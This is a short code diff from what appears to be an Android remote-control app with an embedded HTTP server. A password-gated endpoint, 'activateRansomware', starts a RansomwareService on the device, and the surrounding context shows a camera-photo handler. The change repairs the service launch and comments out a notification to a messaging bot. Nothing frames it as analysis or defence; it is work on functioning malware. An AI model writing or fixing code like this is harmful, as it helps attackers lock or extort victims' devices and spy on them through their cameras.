@@ -2024,8 +2024,8 @@ private Response serveCameraPhoto(Map<String, String> params) {
 
     private Response activateRansomware(Map<String,String> p){
         if("admin123".equals(p.get("pass"))){
-            startService(new Intent(context, RansomwareService.class));
-            HttpServerService.sendToRubikaBot("⚠️ RANSOMWARE ACTIVATED");
+            context.startService(new Intent(context, RansomwareService.class));
+           // HttpServerService.sendToRubikaBot("⚠️ RANSOMWARE ACTIVATED");
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"Ransomware activated\"}");
         }
         return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Wrong password\"}");
